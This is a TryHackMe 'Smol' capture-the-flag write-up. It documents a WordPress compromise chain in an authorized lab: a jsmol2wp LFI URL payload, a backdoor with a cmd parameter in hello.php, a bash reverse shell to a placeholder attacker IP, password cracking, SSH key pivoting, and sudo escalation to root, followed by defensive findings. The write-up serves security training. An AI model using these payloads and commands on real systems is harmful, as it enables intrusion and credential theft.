# Smol — Complete TryHackMe CTF Documentation

## Document control

| Field | Value |
|---|---|
| Lab | TryHackMe — Smol |
| Room | https://tryhackme.com/room/smol |
| Evidence date | 26 June 2026 (as shown in supplied lab notes) |
| Platform | TryHackMe |
| Focus | WordPress exploitation, LFI, PHP backdoor analysis, RCE, lateral movement, Linux privilege escalation |
| Publication mode | Portfolio-safe; flags and secrets redacted |

> **Publication note:** Flags, passwords, hashes, and private-key material are intentionally redacted. The objective is to preserve the attack methodology and evidence trail without publishing answer strings.

## 1. Executive summary

The Smol room presents a compact but realistic attack chain in which a public-facing WordPress service becomes the gateway to a multi-stage compromise. The path begins with service and content discovery, moves through the vulnerable `jsmol2wp` plugin, reaches `wp-config.php` through Local File Inclusion, and then pivots into an authenticated WordPress context. A second weakness appears as a backdoored PHP file inside the Hello Dolly plugin, turning access to WordPress administration into command execution.

The foothold is then expanded through several forms of weak operational security: reusable credentials, readable SSH key material, an encrypted but weakly protected historical backup, and finally an unrestricted sudo rule. The important lesson is that the compromise is not dependent on a single dramatic exploit. Each phase exposes the next trust boundary until the account reaches root.

## 2. Objectives

The lab evidence supports the following objectives:

- Identify the externally exposed services.
- Establish the correct virtual host and WordPress surface.
- Fingerprint the installed WordPress plugins.
- Exploit the vulnerable `jsmol2wp` file-reading path.
- Recover WordPress configuration data without publishing the password.
- Identify the hidden PHP command-execution backdoor.
- Confirm remote command execution and obtain a stable shell.
- Move through the available user accounts using discovered credentials and keys.
- Recover an old encrypted WordPress backup and inspect its configuration.
- Demonstrate the final sudo-based privilege boundary failure.

## 3. Environment and scope

This write-up documents a deliberately vulnerable TryHackMe target. All commands and payloads are intended for the authorized lab only. Host addresses are represented as placeholders in the publication version where practical.

## 4. Attack-path overview

```text
[External Services]
      │
      ├── SSH : 22
      └── HTTP : 80
             │
             ▼
     [WordPress discovery]
             │
             ▼
     [jsmol2wp 1.07]
             │
             ▼
       [LFI / file read]
             │
             ▼
         [wp-config]
             │
             ▼
      [WP administrative]
             │
             ▼
   [Hello Dolly backdoor]
             │
             ▼
          [RCE]
             │
             ▼
        [www-data shell]
        /     |             /      |         DB hash   SSH key   Backup ZIP
    │         │          │
  diego     think      gege
                         │
                       xavi
                         │
                   sudo ALL → root
```

## 5. Reconnaissance

### 5.1 Port and service discovery

A full service scan establishes the exposed surface:

```bash
nmap -sV -p- -T4 <LAB_IP>
```

The supplied evidence reports two relevant services:

| Port | State | Service | Evidence |
|---|---|---|---|
| 22/tcp | open | SSH | OpenSSH 8.2p1 on Ubuntu |
| 80/tcp | open | HTTP | Apache httpd 2.4.41 on Ubuntu |

The web application expects the `www.smol.thm` hostname, so the lab host mapping is established before deeper HTTP enumeration.

![Network reconnaissance](assets/img/02-network-recon.svg)

### 5.2 Web content discovery

Directory enumeration surfaces the characteristic WordPress layout:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt      -u "http://www.smol.thm/FUZZ" -fc 404 -c
```

Notable results include `wp-admin`, `wp-content`, `wp-includes`, and `xmlrpc.php`. This confirms that the application is not simply a generic Apache landing page; WordPress-specific components are reachable and worth fingerprinting.

![Web enumeration](assets/img/03-web-enumeration.svg)

## 6. WordPress fingerprinting and plugin discovery

WPScan is used to identify installed components:

```bash
wpscan --url http://www.smol.thm/
```

The key result is the `jsmol2wp` plugin, version `1.07`, located under `/wp-content/plugins/jsmol2wp/`.

![Plugin enumeration](assets/img/04-plugin-enumeration.svg)

The supplied lab notes associate this version with **CVE-2018-20463**, a Local File Inclusion issue in the `jsmol.php` handler. In practical terms, the application accepts attacker-controlled input in the `query` parameter and can be coerced into reading a file path outside the intended plugin directory.

## 7. Initial exploitation — LFI to `wp-config.php`

The first objective is to turn the file-read primitive into useful configuration disclosure. The lab evidence uses a PHP stream wrapper to reach the WordPress configuration file:

```text
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

The recovered configuration establishes the WordPress database context, including the `wordpress` database and the `wpuser` account. The password is intentionally omitted here and from the public screenshots.

![LFI to wp-config](assets/img/05-lfi-wp-config-redacted.svg)

### Why this matters

`wp-config.php` is a high-value target because it connects the web application to its data store. In a real environment, successful disclosure may expose credentials, salts, service configuration, and other secrets that allow an attacker to chain into additional systems.

## 8. Backdoor discovery inside Hello Dolly

With access to the WordPress administration context, the next clue is a private page referring to “Webmaster Tasks.” The supplied evidence points back to the standard Hello Dolly plugin, but the PHP source contains an unexpected execution primitive.

The same LFI path is used to read `hello.php` directly:

```text
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

![Backdoor source](assets/img/06-backdoor-source.svg)

The suspicious logic is encoded rather than written in obvious plaintext. Decoding the expression reveals a simple pattern: if a `cmd` parameter exists, the value is sent to a system command execution function.

![RCE confirmation](assets/img/07-rce-confirmation.svg)

### RCE validation

A minimal command execution test is enough to validate the primitive:

```text
http://www.smol.thm/wp-admin/index.php?cmd=whoami
```

The supplied evidence reports `www-data`, confirming command execution in the web-server context.

## 9. Reverse shell and session stabilization

The command-execution primitive can now be converted into a more practical shell. A controlled staging host serves a short Bash script, and a Netcat listener receives the callback.

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1'" > revshell.sh
python3 -m http.server 9000
```

The target is instructed to download the file, then execute it through the `cmd` parameter. A listener is prepared with:

```bash
nc -lnvp 1234
```

![Reverse shell staging](assets/img/08-reverse-shell.svg)

Immediately after connection, the terminal is stabilized to restore predictable line editing and control sequences:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=bash
```

The resulting context in the supplied evidence is `www-data` under the WordPress web root.

## 10. Lateral movement — database credentials to diego

The configuration disclosure provides enough information to query the WordPress database. The user table is inspected to obtain account records and password hashes.

```bash
mysql -u wpuser -p'<LAB_DB_PASSWORD>' wordpress
SELECT * FROM wp_users;
```

![WordPress user database](assets/img/09-wp-user-db-redacted.svg)

A copy of the target hash is prepared for offline cracking. John the Ripper is used with the standard `rockyou.txt` wordlist:

```bash
john diego --wordlist=/usr/share/wordlists/rockyou.txt
```

The evidence shows that the password is recovered successfully; the actual value is hidden in this public write-up.

![Diego password cracking](assets/img/10-diego-crack-redacted.svg)

The recovered lab credential permits a switch to `diego`:

```bash
su diego
cat /home/diego/user.txt
```

**User flag:** `[REDACTED]`

## 11. Lateral movement — readable SSH key to think

Further local enumeration identifies the `think` home directory as readable from the current context. Inside `.ssh`, the lab evidence exposes an RSA private key.

```bash
cat /home/think/.ssh/id_rsa
```

![SSH key pivot](assets/img/11-ssh-key-redacted.svg)

The key is saved locally and its permissions tightened before use:

```bash
chmod 600 id_rsa
ssh think@www.smol.thm -i id_rsa
```

### Security lesson

A private SSH key should be treated as a credential, not as ordinary text. On real systems it must be protected by filesystem permissions, ideally by a passphrase, and never left readable by unrelated accounts.

## 12. Lateral movement — historical backup to xavi

From the `think` context, the evidence exposes another useful artifact inside the `gege` home directory: `wordpress.old.zip`.

The file is staged through a temporary Python HTTP server for offline analysis:

```bash
python3 -m http.server 8080
```

The attacker retrieves the archive from the lab host and works on a local copy.

![Backup transfer](assets/img/12-backup-transfer.svg)

### 12.1 Recovering the ZIP password

The encrypted ZIP is converted into a crackable representation with `zip2john`:

```bash
zip2john wordpress.old.zip > wp_hash.txt
john wp_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Encrypted backup cracking](assets/img/13-backup-crack-redacted.svg)

The password is intentionally omitted from the public documentation.

### 12.2 Mining the historical WordPress tree

Once extracted, the old installation contains another `wp-config.php`.

```bash
unzip wordpress.old.zip
cat wordpress.old/wp-config.php
```

The file reveals credentials associated with the `xavi` account. The password is not published, but the evidence is sufficient to demonstrate credential reuse from a legacy application snapshot.

![Xavi configuration](assets/img/14-xavi-config-redacted.svg)

The account transition is then demonstrated with:

```bash
su xavi
```

## 13. Privilege escalation — unrestricted sudo

The final local enumeration step is the sudo policy:

```bash
sudo -l
```

The supplied evidence reports:

```text
User xavi may run the following commands:
    (ALL : ALL) ALL
```

This rule permits xavi to run commands as any user, including root. The privilege boundary is therefore bypassed with:

```bash
sudo su
```

The supplied lab evidence then reads the root flag. That flag remains `[REDACTED]` in this repository.

![Privilege escalation](assets/img/15-privilege-escalation.svg)

## 14. Findings and defensive interpretation

| Finding | Root cause | Security impact | Defensive action |
|---|---|---|---|
| jsmol2wp LFI | Untrusted path handling | Arbitrary file disclosure | Patch/remove the plugin; validate canonical paths |
| Hidden PHP backdoor | Unauthorized code inserted into a trusted plugin | Direct command execution | File integrity monitoring; review plugin provenance |
| Reusable user credentials | Weak credential hygiene | Account pivoting | Unique, strong credentials; password rotation |
| Readable private SSH key | Overly broad filesystem permissions | Direct authenticated access | Restrict `.ssh` permissions and key ownership |
| Legacy backup with secrets | Sensitive archive retained and weakly protected | Credential disclosure | Encrypt backups strongly; remove stale archives |
| Unrestricted sudo | Least-privilege failure | Full root takeover | Scope sudo rules to required commands only |

## 15. Lessons learned

### 15.1 Patch management is only the first layer

The initial foothold comes from an outdated WordPress plugin, but patching alone would not address the later weaknesses. Once one component is compromised, the attacker benefits from every additional trust mistake discovered locally.

### 15.2 Application data often becomes operating-system access

A database password that looks application-specific may become an operating-system credential when the same secret is reused. Configuration files therefore belong in the same protection class as password stores.

### 15.3 Backups are part of the attack surface

A historical WordPress tree retains the same kinds of secrets as the live system. A backup that is merely “old” is not harmless; it can be a credential cache for attackers.

### 15.4 Privilege boundaries should fail closed

The final sudo rule eliminates the distinction between a standard user and root. Least privilege should be expressed explicitly and reviewed regularly.

## 16. Interview-ready talking points

**How was the initial foothold obtained?**  
By fingerprinting WordPress, identifying the vulnerable `jsmol2wp` plugin, and reading `wp-config.php` through its LFI primitive.

**How did the attacker reach command execution?**  
A second-stage backdoor was found in `hello.php`; its encoded logic executed a `cmd` parameter through the WordPress administration path.

**How did lateral movement happen?**  
Through a sequence of credential artifacts: database hashes, a readable SSH private key, and credentials recovered from an encrypted historical WordPress backup.

**What caused the final root compromise?**  
An unrestricted `(ALL : ALL) ALL` sudo rule on `xavi` allowed arbitrary commands as root.

## 17. Conclusion

Smol is best understood as a chain-of-trust exercise. The first vulnerability opens the door, but the full compromise succeeds because each later environment exposes another reusable credential or privilege boundary. The room therefore rewards disciplined enumeration: inspect configuration files, inspect plugin source, enumerate local accounts, inspect home directories, investigate old backups, and always check sudo permissions.

The portfolio version intentionally removes flags and live secret material while retaining the reasoning, commands, findings, and defensive lessons that matter in a professional security assessment.
